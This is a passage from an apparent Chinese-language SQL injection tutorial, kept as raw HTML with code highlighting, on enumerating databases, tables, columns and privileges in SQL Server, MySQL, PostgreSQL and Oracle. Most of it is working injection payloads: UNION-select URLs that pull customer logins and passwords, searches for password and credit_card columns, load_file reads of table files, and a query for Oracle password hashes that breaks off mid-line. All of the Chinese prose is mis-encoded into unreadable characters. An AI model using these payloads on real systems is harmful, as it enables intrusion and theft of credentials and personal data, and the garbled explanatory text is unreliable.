punctuation">)</span>--è¿”å›ä¸‹åˆ—å†…å®¹ï¼šORA-20000: Oracle Text error:DRG-11701: thesaurus VICTIMUSER does not existORA-06512: at <span class="token string">"CTXSYS.DRUE"</span>, line <span class="token number">160</span>ORA-06512: at <span class="token string">"CTXSYS.DRITHSX"</span>, line <span class="token number">538</span>ORA-06512: at line <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æšä¸¾æ•°æ®åº“æ¨¡å¼"><a href="#æšä¸¾æ•°æ®åº“æ¨¡å¼" class="headerlink" title="æšä¸¾æ•°æ®åº“æ¨¡å¼"></a>æšä¸¾æ•°æ®åº“æ¨¡å¼</h3><p>åœ¨æ‹¥æœ‰æƒé™çš„å‰æä¸‹ï¼Œå°†æ‰€æœ‰å…ƒæ•°æ®å…¨éƒ¨æšä¸¾å‡ºæ¥</p><h4 id="SQL-Server"><a href="#SQL-Server" class="headerlink" title="SQL Server"></a>SQL Server</h4><p>æœ‰ä¸€ä¸ªè¿”å›æŒ‡å®šå•†å“çš„è¯¦ç»†ä¿¡æ¯çš„é¡µé¢<code>http://test</code></p><p>è¿”å›æ•°æ®è¡¨åˆ—è¡¨</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test?id=12+union+select+null,name,null,null+from+master..sysdatabases</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>masteræ•°æ®åº“åŒ…å«äº†å…¶ä»–æ•°æ®åº“çš„å…ƒæ•°æ®ï¼Œå¦‚master..sysdatabaseså¯ä»¥æ£€ç´¢å‡ºæ•°æ®åº“åç§°åˆ—è¡¨</p><p>e-shopæ•°æ®åº“åŒ…å«äº†ç”µå­å•†åŠ¡åº”ç”¨ä½¿ç”¨çš„æ‰€æœ‰æ•°æ®ã€‚</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> db_name<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">-- æ­£åœ¨ä½¿ç”¨çš„æ•°æ®åº“åç§°</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æšä¸¾è¡¨åï¼Œæ¯ä¸ªæ•°æ®éƒ½æœ‰ä¸€ä¸ªåä¸º<code>sysobjects</code>çš„è¡¨ï¼Œå‡å¦‚æƒ³è¦æ£€ç´¢e-shopæ•°æ®åº“çš„è¡¨å</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> name <span class="token keyword">FROM</span> e<span class="token operator">-</span>shop<span class="token punctuation">.</span><span class="token punctuation">.</span>sysobjects <span class="token keyword">WHERE</span> xtype<span class="token operator">=</span><span class="token string">'U'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¾—åˆ°è¡¨åï¼Œæšä¸¾åˆ—åï¼Œä»¥customersè¡¨ä¸ºä¾‹</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> name <span class="token keyword">FROM</span> e<span class="token operator">-</span>shop<span class="token punctuation">.</span><span class="token punctuation">.</span>syscolumns <span class="token keyword">WHERE</span> id <span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> id <span class="token keyword">FROM</span> e<span class="token operator">-</span>shop<span class="token punctuation">.</span><span class="token punctuation">.</span>sysobjects <span class="token keyword">WHERE</span> name <span class="token operator">=</span> <span class="token string">'customers'</span><span class="token punctuation">)</span>â€ƒ<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™å¥SQLç”¨çš„æ˜¯é•¶åµŒæŸ¥è¯¢ï¼Œå…ˆç”¨é‡Œé¢çš„æŸ¥å‡ºcustomersè¡¨çš„idï¼Œå†é€šè¿‡idæŒ‡å®šè¡¨æŸ¥åˆ—åï¼Œä¹Ÿèƒ½ä½¿ç”¨è¿æ¥æŸ¥è¯¢</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> a<span class="token punctuation">.</span>name <span class="token keyword">FROM</span> e<span class="token operator">-</span>shop<span class="token punctuation">.</span><span class="token punctuation">.</span>syscolumns a<span class="token punctuation">,</span>e_shop<span class="token punctuation">.</span><span class="token punctuation">.</span>sysobjects b <span class="token keyword">WHERE</span>b<span class="token punctuation">.</span>name <span class="token operator">=</span><span class="token string">'customers'</span> <span class="token operator">AND</span> a<span class="token punctuation">.</span>id <span class="token operator">=</span> b<span class="token punctuation">.</span>id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>çŸ¥é“äº†åˆ—åï¼Œå¯ä»¥å¼€å§‹æšä¸¾å­—æ®µï¼Œçˆ†æ•°æ®äº†ï¼Œæ•°æ®ç±»å‹çš„æ£€éªŒå‰é¢è¯´è¿‡</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test?id=12+union+select+null,login,password, null+from+e-shop..Customers-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é˜²æš´åŠ›ç ´è§£scryptç®—æ³•</p><h4 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h4><p>æå–æ•°æ®åº“åç§°, ç„¶åè½¬å‘è¡¨ã€åˆ—ï¼Œæœ€åæ˜¯æ•°æ®æœ¬èº«ã€‚</p><p>æ£€ç´¢ç”¨æˆ·</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">select</span> current_users<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ²¡æœ‰ç®¡ç†å‘˜æƒé™ï¼Œå¤§äº5.0çš„ç‰ˆæœ¬èƒ½ç”¨information_schemaï¼Œè·å–æ•°æ®åº“ååˆ—è¡¨</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token keyword">schema</span> form information_schema<span class="token punctuation">.</span>schemata<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æšä¸¾è¡¨åï¼Œåº“åcustomers_db</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> table_schema<span class="token punctuation">,</span>table_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">WHERE</span> table_schema<span class="token operator">=</span><span class="token string">'customers_db'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æšä¸¾æ‰€æœ‰è¡¨å</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> table_schema<span class="token punctuation">,</span>table_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">WHERE</span> table_schema <span class="token operator">!=</span> <span class="token string">'mysql'</span> <span class="token operator">AND</span> table_schema <span class="token operator">!=</span> <span class="token string">'information_schema'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ£€ç´¢åˆ—</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> table_schema<span class="token punctuation">,</span>table_name<span class="token punctuation">,</span>column_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">WHERE</span> table_name<span class="token operator">=</span><span class="token string">'test'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å…¨éƒ¨åˆ—</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> table_schema<span class="token punctuation">,</span>table_name<span class="token punctuation">,</span>column_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">WHERE</span> table_schema <span class="token operator">!=</span> <span class="token string">'mysql'</span> <span class="token operator">AND</span> table_schema <span class="token operator">!=</span> <span class="token string">'information_schema'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™æ ·å°±å¯ä»¥çˆ†å‡ºæ•°æ®åº“å…¨éƒ¨å†…å®¹ï¼Œå½“ç„¶ä½ èƒ½åŠ ä¸€äº›é™åˆ¶æ¡ä»¶ï¼Œæ‰¾åˆ°ä½ éœ€è¦çš„æ•°æ®</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> table_schema<span class="token punctuation">,</span>table_name<span class="token punctuation">,</span>column_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">WHERE</span> column_name <span class="token operator">LIKE</span> <span class="token string">'password'</span> <span class="token operator">OR</span> column_name <span class="token operator">LIKE</span> <span class="token string">'credit_card'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æŸ¥è¯¢ç”¨æˆ·æˆæƒä¿¡æ¯</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> grantee<span class="token punctuation">,</span>privilege_type<span class="token punctuation">,</span>is_grantable <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span>user_privileges<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>5.0ä¹‹å‰çš„æ•°æ®åº“</p><p>å…ˆè®¿é—®å­˜å‚¨ç›®æ ‡æ•°æ®åº“çš„æ–‡ä»¶ï¼Œå°†å…¶åŸå§‹å†…å®¹å¯¼å…¥åˆ°æˆ‘ä»¬åˆ›å»ºçš„ä¸€å¼ è¡¨ä¸­ï¼Œç„¶åä½¿ç”¨å‰é¢ä»‹ç»çš„æŠ€æœ¯æå–è¯¥è¡¨ã€‚</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ•°æ®åº“çš„æ–‡ä»¶ä¿å­˜åœ¨ä¸æ•°æ®åº“åç§°ç›¸åŒçš„ç›®å½•ä¸‹ã€‚æ­¤ç›®å½•åŒ…å«åœ¨ä¸»MySQLæ•°æ®ç›®å½•ä¸­ï¼Œå¯ä½¿ç”¨ä¸‹åˆ—æŸ¥è¯¢æ¥è¿”å›è¯¥ç›®å½•ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> @<span class="token variable">@datadir</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ•°æ®åº“çš„æ‰€æœ‰è¡¨åŒ…å«åœ¨ä¸€ä¸ªæ‰©å±•åä¸ºMYDçš„æ–‡ä»¶ä¸­ã€‚ä¾‹å¦‚ï¼Œä¸‹é¢æ˜¯æ•°æ®åº“é»˜è®¤çš„ ä¸€äº›MYDæ–‡ä»¶ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tables_priv.MYDhost.MYDhelp_keyword.MYDcolumns_priv.MYDdb.MYD<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä½¿ç”¨ä¸‹åˆ—æŸ¥è¯¢æå–è¯¥æ•°æ®åº“ä¸­ç‰¹å®šè¡¨çš„å†…å®¹ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> load_file<span class="token punctuation">(</span><span class="token string">'databasename/tablename.MYD'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¦æ˜¯æ²¡æœ‰information_schema,å°±å¿…é¡»å…ˆæš´åŠ›ç ´è§£è¡¨ååæ‰èƒ½æˆåŠŸæ‰§è¡Œè¯¥æŸ¥è¯¢ã€‚load_fileå…è®¸æ£€ç´¢çš„å­—èŠ‚æ•°æœ‰ä¸ªæœ€å¤§å€¼ï¼Œè¯¥å€¼ç”±<code>@@max_allowed_packet</code> å˜é‡æŒ‡å®šã€‚æ‰€ä»¥è¯¥æŠ€æœ¯ä¸é€‚ç”¨äºå­˜å‚¨äº†å¤§é‡æ•°æ®çš„è¡¨ã€‚</p><h4 id="PostgreSQL-1"><a href="#PostgreSQL-1" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h4><p>æ£€ç´¢æ‰€æœ‰æ•°æ®åº“</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> datname <span class="token keyword">FROM</span> pg_database<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æŸ¥æ‰¾å½“å‰æ•°æ®åº“</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> current_database<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ£€ç´¢æ•°æ®åº“ç”¨æˆ·åˆ—è¡¨</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> usename <span class="token keyword">from</span> pg_user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æŸ¥è¯¢å½“å‰ç”¨æˆ·</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token keyword">user</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token keyword">current_user</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token keyword">session_user</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> getpgusername<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>session_userè¿”å›å¯åŠ¨å½“å‰æ•°æ®åº“è¿æ¥çš„ç”¨æˆ·ï¼Œè€Œcurrent_userå’Œuser(äºŒè€…æ˜¯ç­‰ä»·çš„)åˆ™è¿”å›å½“å‰æ‰§è¡Œä¸Šä¸‹æ–‡çš„ç”¨æˆ·ï¼Œå³è¿”å›ç”¨äºæ£€æŸ¥è®¸å¯æƒé™çš„é‚£ä¸ªç”¨æˆ·è´¦å·ã€‚é™¤éåœ¨æŸå¤„è°ƒç”¨äº† SET ROLEæŒ‡ä»¤ï¼Œå¦åˆ™äºŒè€…é€šå¸¸è¿”å›ç›¸åŒçš„å€¼ã€‚å¯¹äºæœ€åä¸€æ¡è¯­å¥ï¼Œgetpgusername()å°†è¿”å›ä¸å½“å‰çº¿ç¨‹å…³è”çš„ç”¨æˆ·ã€‚</p><p>æšä¸¾æ‰€æœ‰æ¨¡å¼ä¸­çš„å…¨éƒ¨è¡¨</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> c<span class="token punctuation">.</span>relname <span class="token keyword">FROM</span> pg_catalog<span class="token punctuation">.</span>pg_class c <span class="token keyword">LEFT</span> <span class="token keyword">JOIN</span> pg_catalog<span class="token punctuation">.</span>pg_namespace n <span class="token keyword">ON</span> n<span class="token punctuation">.</span>oid <span class="token operator">=</span> c<span class="token punctuation">.</span>relnamespace <span class="token keyword">WHERE</span> c<span class="token punctuation">.</span>relkind <span class="token operator">IN</span> <span class="token punctuation">(</span><span class="token string">'r'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token operator">AND</span> n<span class="token punctuation">.</span>nspname <span class="token operator">NOT</span> <span class="token operator">IN</span> <span class="token punctuation">(</span><span class="token string">'pg_catalog'</span><span class="token punctuation">,</span> <span class="token string">'pg_toast'</span><span class="token punctuation">)</span> <span class="token operator">AND</span> pg_catalog<span class="token punctuation">.</span>pg_table_is_visible<span class="token punctuation">(</span>c<span class="token punctuation">.</span>oid<span class="token punctuation">)</span><span class="token keyword">SELECT</span> tablename <span class="token keyword">FROM</span> pg_tables <span class="token keyword">WHERE</span> tablename <span class="token operator">NOT</span> <span class="token operator">LIKE</span> <span class="token string">'pg_%'</span> <span class="token operator">AND</span> tablename <span class="token operator">NOT</span> <span class="token operator">LIKE</span> <span class="token string">'sql_%'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æ‰€æœ‰åˆ—(publicä¸‹çš„)</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> relname<span class="token punctuation">,</span>A<span class="token punctuation">.</span>attname <span class="token keyword">FROM</span> pg_class C<span class="token punctuation">,</span>pg_namespace N<span class="token punctuation">,</span>pg_attribute A<span class="token punctuation">,</span>pg_type T <span class="token keyword">WHERE</span> <span class="token punctuation">(</span>C<span class="token punctuation">.</span>relkind<span class="token operator">=</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token operator">AND</span> <span class="token punctuation">(</span>N<span class="token punctuation">.</span>oid<span class="token operator">=</span>C<span class="token punctuation">.</span>relnamespace<span class="token punctuation">)</span> <span class="token operator">AND</span> <span class="token punctuation">(</span>A<span class="token punctuation">.</span>attrelid<span class="token operator">=</span>C<span class="token punctuation">.</span>oid<span class="token punctuation">)</span> <span class="token operator">AND</span> <span class="token punctuation">(</span>A<span class="token punctuation">.</span>atttypid<span class="token operator">=</span>T<span class="token punctuation">.</span>oid<span class="token punctuation">)</span> <span class="token operator">AND</span> <span class="token punctuation">(</span>A<span class="token punctuation">.</span>attnum<span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">AND</span> <span class="token punctuation">(</span><span class="token operator">NOT</span> A<span class="token punctuation">.</span>attisdropped<span class="token punctuation">)</span> <span class="token operator">AND</span> <span class="token punctuation">(</span>N<span class="token punctuation">.</span>nspname <span class="token operator">ILIKE</span> <span class="token string">'public'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>passwdåˆ—</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> relname<span class="token punctuation">,</span>A<span class="token punctuation">.</span>attname <span class="token keyword">FROM</span> pg_class C<span class="token punctuation">,</span>pg_namespace N<span class="token punctuation">,</span>pg_attribute A<span class="token punctuation">,</span>pg_type T <span class="token keyword">WHERE</span> <span class="token punctuation">(</span>C<span class="token punctuation">.</span>relkind<span class="token operator">=</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token operator">AND</span> <span class="token punctuation">(</span>N<span class="token punctuation">.</span>oid<span class="token operator">=</span>C<span class="token punctuation">.</span>relnamespace<span class="token punctuation">)</span> <span class="token operator">AND</span> <span class="token punctuation">(</span>A<span class="token punctuation">.</span>attrelid<span class="token operator">=</span>C<span class="token punctuation">.</span>oid<span class="token punctuation">)</span> <span class="token operator">AND</span> <span class="token punctuation">(</span>A<span class="token punctuation">.</span>atttypid<span class="token operator">=</span>T<span class="token punctuation">.</span>oid<span class="token punctuation">)</span> <span class="token operator">AND</span> <span class="token punctuation">(</span>A<span class="token punctuation">.</span>attnum<span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">AND</span> <span class="token punctuation">(</span><span class="token operator">NOT</span> A<span class="token punctuation">.</span>attisdropped<span class="token punctuation">)</span> <span class="token operator">AND</span> <span class="token punctuation">(</span>N<span class="token punctuation">.</span>nspname <span class="token operator">ILIKE</span> <span class="token string">'public'</span><span class="token punctuation">)</span> <span class="token operator">AND</span>attname <span class="token operator">LIKE</span> <span class="token string">'%passwd%'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h4><p>æ— æ³•æšä¸¾å­˜åœ¨çš„æ•°æ®åº“</p><p>æšä¸¾æ‰€æœ‰å±äºå½“å‰ç”¨æˆ·çš„è¡¨</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> table_name <span class="token keyword">from</span> user_tables<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æšä¸¾æ‰€æœ‰è¡¨å’Œè¡¨çš„æ‹¥æœ‰è€…</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> owner<span class="token punctuation">,</span>table_name <span class="token keyword">from</span> all_tables<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æšä¸¾æ›´å¤šå…³äºåº”ç”¨è¡¨çš„ä¿¡æ¯ä»¥ç¡®å®šè¡¨ä¸­å‡ºç°çš„åˆ—æ•°å’Œè¡Œæ•°</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> a<span class="token punctuation">.</span>table_name<span class="token operator">||</span><span class="token string">'['</span><span class="token operator">||</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">']='</span><span class="token operator">||</span>num_rows <span class="token keyword">from</span> user_tab_columns a<span class="token punctuation">,</span>user_tables b <span class="token keyword">where</span> a<span class="token punctuation">.</span>table_name<span class="token operator">=</span>b<span class="token punctuation">.</span>table_name <span class="token keyword">group</span> <span class="token keyword">by</span>a<span class="token punctuation">.</span>table_name<span class="token punctuation">,</span>num_rowsEMP<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">14</span><span class="token keyword">DUMMY</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span>DEPT<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">4</span>SALGRADE<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">5</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸ºæ‰€æœ‰å¯è®¿é—®æˆ–å¯ç”¨çš„è¡¨æšä¸¾ç›¸åŒçš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç”¨æˆ·ã€è¡¨åä»¥åŠè¡¨ä¸­åŒ…å«çš„è¡Œæ•°</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> b<span class="token punctuation">.</span>owner<span class="token operator">||</span><span class="token string">'.'</span><span class="token operator">||</span>a<span class="token punctuation">.</span>table_name<span class="token operator">||</span><span class="token string">'['</span><span class="token operator">||</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">']='</span><span class="token operator">||</span>num_rows <span class="token keyword">from</span> all_tab_columns a<span class="token punctuation">,</span>all_tables b <span class="token keyword">where</span> a<span class="token punctuation">.</span>table_name<span class="token operator">=</span>b<span class="token punctuation">.</span>table_name <span class="token keyword">group</span> <span class="token keyword">by</span> b<span class="token punctuation">.</span>owner<span class="token punctuation">,</span>a<span class="token punctuation">.</span>table_name<span class="token punctuation">,</span>num_rows<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æšä¸¾æ¯å¼ è¡¨çš„åˆ—å’Œæ•°æ®ç±»å‹ä»¥ä¾¿æ›´å®Œæ•´åœ°äº†è§£æ•°æ®åº“æ¨¡å¼</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> table_name<span class="token operator">||</span><span class="token string">':'</span><span class="token operator">||</span>column_name<span class="token operator">||</span><span class="token string">':'</span><span class="token operator">||</span>data_type<span class="token operator">||</span><span class="token string">':'</span><span class="token operator">||</span>column_id <span class="token keyword">from</span> user_tab_columns <span class="token keyword">order</span> <span class="token keyword">by</span> table_name<span class="token punctuation">,</span>column_idDEPT:DEPTNO:NUMBER:<span class="token number">1</span>DEPT:DNAME:VARCHAR2:<span class="token number">2</span>DEPT:LOC:VARCHAR2:<span class="token number">3</span><span class="token keyword">DUMMY</span>:<span class="token keyword">DUMMY</span>:NUMBER:<span class="token number">1</span>EMP:EMPNO:NUMBER:<span class="token number">1</span>EMP:ENAME:VARCHAR2:<span class="token number">2</span>EMP:JOB:VARCHAR2:<span class="token number">3</span>EMP:MGR:NUMBER:<span class="token number">4</span>EMP:HIREDATE:<span class="token keyword">DATE</span>:<span class="token number">5</span>EMP:SAL:NUMBER:<span class="token number">6</span>EMP:COMM:NUMBER:<span class="token number">7</span>EMP:DEPTNO:NUMBER:<span class="token number">8</span>SALGRADE:GRADE:NUMBER:<span class="token number">1</span>SALGRADE:LOSAL:NUMBER:<span class="token number">2</span>SALGRADE:HISAL:NUMBER:<span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿”å›å½“å‰æ•°æ®åº“ç”¨æˆ·æƒé™</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- è·å–å½“å‰ç”¨æˆ·çš„ç³»ç»Ÿæƒé™ï¼š</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> user_sys_privs<span class="token punctuation">;</span><span class="token comment">-- how system privileges of the current user</span><span class="token comment">-- è·å–å½“å‰ç”¨æˆ·çš„è§’è‰²æƒé™ï¼š</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> user_role_privs<span class="token punctuation">;</span><span class="token comment">-- show role privileges of the current user</span><span class="token comment">-- è·å–å½“å‰ç”¨æˆ·çš„è¡¨æ ¼æƒé™ï¼š</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> user_tab_privs<span class="token punctuation">;</span><span class="token comment">-- è·å–å½“å‰ç”¨æˆ·çš„åˆ—æƒé™ï¼š</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> user_col_privs<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è·å–æ‰€æœ‰å¯èƒ½çš„æƒé™åˆ—è¡¨</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- è·å–æ‰€æœ‰ç³»ç»Ÿæƒé™ï¼š</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> all_sys_privs<span class="token punctuation">;</span><span class="token comment">-- è·å–æ‰€æœ‰è§’è‰²æƒé™ï¼š</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> all_role_privs<span class="token punctuation">;</span><span class="token comment">-- è·å–æ‰€æœ‰è¡¨æƒé™ï¼š</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> all_tab_privs<span class="token punctuation">;</span><span class="token comment">-- è·å–æ‰€æœ‰åˆ—æƒé™ï¼š</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> all_col_privs<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿”å›æ•°æ®åº“ä¸­æ‰€æœ‰ç”¨æˆ·çš„åˆ—è¡¨ï¼Œé»˜è®¤ä»»æ„æ•°æ®åº“ç”¨æˆ·å¯æ‰§è¡Œ</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> username<span class="token punctuation">,</span>created <span class="token keyword">from</span> all_users <span class="token keyword">order</span> <span class="token keyword">by</span> created <span class="token keyword">desc</span><span class="token punctuation">;</span>SCOTT<span class="token number">04</span><span class="token operator">-</span>JAN <span class="token operator">-</span><span class="token number">09</span>PHP<span class="token number">04</span><span class="token operator">-</span>JAN <span class="token operator">-</span><span class="token number">09</span>PLSQL<span class="token number">02</span><span class="token operator">-</span>JAN <span class="token operator">-</span><span class="token number">09</span>MONODEMO<span class="token number">29</span><span class="token operator">-</span><span class="token keyword">DEC</span> <span class="token operator">-</span><span class="token number">08</span>DEMO1<span class="token number">29</span><span class="token operator">-</span><span class="token keyword">DEC</span> <span class="token operator">-</span><span class="token number">08</span>ALEX<span class="token number">14</span><span class="token operator">-</span><span class="token keyword">DEC</span> <span class="token operator">-</span><span class="token number">08</span>OWBSYS<span class="token number">13</span><span class="token operator">-</span><span class="token keyword">DEC</span> <span class="token operator">-</span><span class="token number">08</span>FLOWS_030000<span class="token number">13</span><span class="token operator">-</span><span class="token keyword">DEC</span> <span class="token operator">-</span><span class="token number">08</span>APEX <span class="token keyword">PUBLIC</span> <span class="token keyword">USER</span><span class="token number">13</span><span class="token operator">-</span><span class="token keyword">DEC</span> <span class="token operator">-</span><span class="token number">08</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨Oracle 10g R2ä¹‹åçš„ç‰ˆæœ¬ä¸­ï¼Œæ™®é€šç”¨æˆ·å¯ä½¿ç”¨ä¸‹åˆ—SELECTè¯­å¥æ£€ç´¢æ•°æ®åº“çš„ç”¨æˆ·åå’Œå“ˆå¸Œå£ä»¤</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> name<span class="token punctuation">,</span> password<span class="token punctuation">,</span> astatus <span class="token 